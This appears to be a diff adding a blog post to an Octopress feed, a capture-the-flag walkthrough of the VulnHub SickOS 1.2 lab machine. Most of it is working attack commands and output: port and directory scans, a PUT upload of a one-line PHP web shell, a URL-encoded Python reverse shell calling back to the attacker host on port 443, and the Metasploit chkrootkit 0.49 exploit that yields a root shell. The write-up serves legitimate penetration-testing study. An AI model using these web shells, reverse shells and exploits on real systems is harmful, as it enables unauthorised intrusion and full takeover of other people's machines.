@@ -4,7 +4,7 @@
   <title><![CDATA[F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2016-05-29T01:55:13-04:00</updated>
+  <updated>2016-06-05T03:53:15-04:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -12,6 +12,549 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] SickOS 1.2]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2/"/>
+    <updated>2016-06-05T03:03:17-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2</id>
+    <content type="html"><![CDATA[<p>&ldquo;This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/d4rk,199/">D4rk</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sickos-12,144/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>
+
+<p>Target: SickOS: 1.2 (<em>10.1.1.133/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>File upload via HTTP PUT method</li>
+<li>python reverse shell</li>
+<li>chkrootkit 0.49 Local Root Exploit</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
+<li>Use dirb tool to discover hidden directory [<font color="FF8000">dirb</font>]</li>
+<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
+<li>Exploit HTTP PUT Method to upload one-line PHP shell</li>
+<li>Use python reverse shell to get a better shell</li>
+<li>Enumeration &amp;&amp; Exploit <code>chkrootkit 0.49</code> to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="http://www.metasploit.com/">Metasploit</a></li>
+<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="http://dirb.sourceforge.net/about.html">dirb</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell cheat sheet</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.133 in this case).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
+</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
+</span><span class='line'>10.1.1.133    00:0c:29:0f:eb:df   VMware, Inc.
+</span><span class='line'>10.1.1.254    00:50:56:f0:91:47   VMware, Inc.
+</span><span class='line'>
+</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.290 seconds <span class="o">(</span>111.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>10.1.1.133</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.133/32 --rate<span class="o">=</span>10000
+</span><span class='line'>
+</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-06-05 04:39:01 GMT
+</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class='line'>Initiating SYN Stealth Scan
+</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span><span class='line'>Discovered open port 22/tcp on 10.1.1.133
+</span><span class='line'>Discovered open port 80/tcp on 10.1.1.133
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There are 2 ports (22, 80) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 7.12 scan initiated Sun Jun  5 14:40:00 2016 as: nmap -sV -A -O -v -oN 133_nmap.txt 10.1.1.133</span>
+</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.133
+</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">998</span> filtered ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> ssh-hostkey:
+</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="o">(</span>DSA<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="o">(</span>RSA<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="o">(</span>ECDSA<span class="o">)</span>
+</span><span class='line'>80/tcp open  http    lighttpd 1.4.28
+</span><span class='line'><span class="p">|</span> http-methods:
+</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span>_http-server-header: lighttpd/1.4.28
+</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span><span class='line'>MAC Address: 00:0C:29:0F:EB:DF <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>... turncate ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run <code>nikto</code> to scan WEB application, but nothing found.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
+</span><span class='line'>+ Target Host: 10.1.1.133
+</span><span class='line'>+ Target Port: 80
+</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then run <code>dirb</code> to discover potential hidden directories and one folder was found: <code>/test/</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# dirb http://10.1.1.133/
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>DIRB v2.22
+</span><span class='line'>By The Dark Raver
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>START_TIME: Sun Jun  <span class="m">5</span> 14:46:31 2016
+</span><span class='line'>URL_BASE: http://10.1.1.133/
+</span><span class='line'>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>GENERATED WORDS: <span class="m">4612</span>
+</span><span class='line'>
+</span><span class='line'>---- Scanning URL: http://10.1.1.133/ ----
+</span><span class='line'>+ http://10.1.1.133/index.php <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:163<span class="o">)</span>
+</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://10.1.1.133/test/
+</span><span class='line'>
+</span><span class='line'>---- Entering directory: http://10.1.1.133/test/ ----
+</span><span class='line'><span class="o">(</span>!<span class="o">)</span> WARNING: Directory IS LISTABLE. No need to scan it.
+</span><span class='line'>    <span class="o">(</span>Use mode <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> you want to scan it anyway<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>END_TIME: Sun Jun  <span class="m">5</span> 14:46:34 2016
+</span><span class='line'>DOWNLOADED: <span class="m">4612</span> - FOUND: 1
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then try to enumerate HTTP methods by using <code>curl</code>. Nothing found in <code>/</code> but lots methods are available in <code>/test/</code> including method <code>PUT</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X OPTIONS http://10.1.1.133/test
+</span><span class='line'>*   Trying 10.1.1.133...
+</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
+</span><span class='line'>&gt; OPTIONS /test HTTP/1.1
+</span><span class='line'>&gt; Host: 10.1.1.133
+</span><span class='line'>&gt; User-Agent: curl/7.47.0
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt;
+</span><span class='line'>&lt; HTTP/1.1 <span class="m">301</span> Moved Permanently
+</span><span class='line'>&lt; DAV: 1,2
+</span><span class='line'>&lt; MS-Author-Via: DAV
+</span><span class='line'>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+</span><span class='line'>&lt; Location: http://10.1.1.133/test/
+</span><span class='line'>&lt; Content-Length: 0
+</span><span class='line'>&lt; Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 04:56:31 GMT
+</span><span class='line'>&lt; Server: lighttpd/1.4.28
+</span><span class='line'>&lt;
+</span><span class='line'>* Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, uploading one-line PHP shell with <code>PUT</code> method.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X PUT -d <span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span> http://10.1.1.133/test/shell.php
+</span><span class='line'>*   Trying 10.1.1.133...
+</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
+</span><span class='line'>&gt; PUT /test/shell.php HTTP/1.1
+</span><span class='line'>&gt; Host: 10.1.1.133
+</span><span class='line'>&gt; User-Agent: curl/7.47.0
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt; Content-Length: 30
+</span><span class='line'>&gt; Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>&gt;
+</span><span class='line'>* upload completely sent off: <span class="m">30</span> out of <span class="m">30</span> bytes
+</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
+</span><span class='line'>&lt; Content-Length: 0
+</span><span class='line'>&lt; Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 05:04:11 GMT
+</span><span class='line'>&lt; Server: lighttpd/1.4.28
+</span><span class='line'>&lt;
+</span><span class='line'>* Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.2/1.png"></p>
+
+<p>Now set up <code>nc</code> to listen on port <code>443</code> (tried port &lsquo;4444&rsquo; but failed due to be blocked) and Then I tried to upload reverse shell via <code>wget</code> but failed for some reason and finally got the following <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="pentestmonkey Reverse Shell Cheat Sheet">method</a> works:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="s2">&quot;http://10.1.1.133/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.1.1.132%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Got a limited shell.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 443
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span><span class='line'>10.1.1.133: inverse host lookup failed: Unknown host
+</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.133<span class="o">]</span> 33544
+</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span>whoami
+</span><span class='line'>www-data
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to get a better and stable shell, I set up metasploit and re-run the python shell again:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/multi/handler
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
+</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 10.1.1.132
+</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.1.1.132
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/shell_reverse_tcp
+</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/shell_reverse_tcp
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt;
+</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.1.1.132:443
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.132:443 -&gt; 10.1.1.133:33545<span class="o">)</span> at 2016-06-05 15:41:50 +1000
+</span><span class='line'>
+</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span>^Z
+</span><span class='line'>Background session 1? <span class="o">[</span>y/N<span class="o">]</span>  y
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After spending couple of hours to <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="g0tmi1k Basic linux privilege escalation guide">enumerate</a> the target system and finally found an vulnerable program (<a href="https://www.exploit-db.com/exploits/33899/" title="chkrootkit 0.49 - Local Root Vulnerability">chkrookit version 0.49</a>) running on the system.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dpkg -l <span class="p">|</span> grep chkroot
+</span><span class='line'>rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploit <code>chkrootkit</code> to get ROOT!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/unix/local/chkrootkit
+</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; show options
+</span><span class='line'>
+</span><span class='line'>Module options <span class="o">(</span>exploit/unix/local/chkrootkit<span class="o">)</span>:
+</span><span class='line'>
+</span><span class='line'>   Name        Current Setting       Required  Description
+</span><span class='line'>   ----        ---------------       --------  -----------
+</span><span class='line'>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
+</span><span class='line'>   SESSION     <span class="m">1</span>                     yes       The session to run this module on.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Exploit target:
+</span><span class='line'>
+</span><span class='line'>   Id  Name
+</span><span class='line'>   --  ----
+</span><span class='line'>   <span class="m">0</span>   Automatic
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="nb">set </span>lport 8080
+</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 8080
+</span><span class='line'>
+</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; run -j
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse TCP double handler on 10.1.1.132:8080
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Rooting depends on the crontab <span class="o">(</span>this could take a <span class="k">while</span><span class="o">)</span>
+</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="o">[</span>*<span class="o">]</span> Payload written to /tmp/update
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Waiting <span class="k">for</span> chkrootkit to run via cron...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Accepted the first client connection...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Accepted the second client connection...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command: <span class="nb">echo </span>cywywDOR3lw9KtfF<span class="p">;</span>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Writing to socket A
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Writing to socket B
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Reading from sockets...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Reading from socket A
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> A: <span class="s2">&quot;cywywDOR3lw9KtfF\r\n&quot;</span>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Matching...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> B is input...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">2</span> opened <span class="o">(</span>10.1.1.132:8080 -&gt; 10.1.1.133:47139<span class="o">)</span> at 2016-06-05 15:47:03 +1000
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/update
+</span><span class='line'>
+</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -l
+</span><span class='line'>
+</span><span class='line'>Active <span class="nv">sessions</span>
+</span><span class='line'><span class="o">===============</span>
+</span><span class='line'>
+</span><span class='line'>  Id  Type         Information                                             Connection
+</span><span class='line'>  --  ----         -----------                                             ----------
+</span><span class='line'>  <span class="m">1</span>   shell linux  /bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off <span class="nv">$ </span> 10.1.1.132:443 -&gt; 10.1.1.133:33545 <span class="o">(</span>10.1.1.133<span class="o">)</span>
+</span><span class='line'>  <span class="m">2</span>   shell unix                                                           10.1.1.132:8080 -&gt; 10.1.1.133:47139 <span class="o">(</span>10.1.1.133<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -i 2
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting interaction with 2...
+</span><span class='line'>
+</span><span class='line'>587635846
+</span><span class='line'>xjfpouiBcdHXtWSGDLawUifFliLoRHgO
+</span><span class='line'><span class="nb">true</span>
+</span><span class='line'>glQiWVKYGXJIbMNxCzFdLkHTvwzJXMsL
+</span><span class='line'>XhEJPxQGJEXCqeHWEuuyRuhgtzDjhhsG
+</span><span class='line'>lblxnAmeZfPiTZxaWNHygwoaqIzqbUNo
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then grab the FLAG file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
